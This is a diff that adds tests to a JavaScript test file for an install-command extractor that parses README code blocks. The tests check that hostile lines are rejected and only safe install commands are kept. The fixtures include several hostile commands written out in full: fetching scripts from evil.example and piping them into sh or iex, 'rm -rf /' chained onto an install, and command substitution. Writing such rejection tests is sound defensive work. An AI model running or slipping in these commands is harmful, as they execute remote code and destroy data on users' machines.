@@ -47,4 +47,28 @@ describe("extractInstallCommands", () => {
   test("ignores install lines outside fences", () => {
     expect(extractInstallCommands("Just run brew install foo")).toEqual([]);
   });
+
+  test("rejects pipe-to-shell and chained forms", () => {
+    const readme = [
+      "```",
+      "curl https://evil.example/install.sh | sh",
+      "brew install foo && rm -rf /",
+      "irm https://evil.example/x.ps1 | iex",
+      "powershell -c \"irm https://evil.example | iex\"",
+      "brew install safe-tool",
+      "```",
+    ].join("\n");
+    expect(extractInstallCommands(readme)).toEqual([
+      { command: "brew install safe-tool", platform: "macos" },
+    ]);
+  });
+
+  test("rejects command substitution and backticks", () => {
+    const readme = ["```", 'curl $(echo evil) /x', "wget `id`", "npm install lodash", "```"].join(
+      "\n",
+    );
+    expect(extractInstallCommands(readme)).toEqual([
+      { command: "npm install lodash", platform: "universal" },
+    ]);
+  });
 });
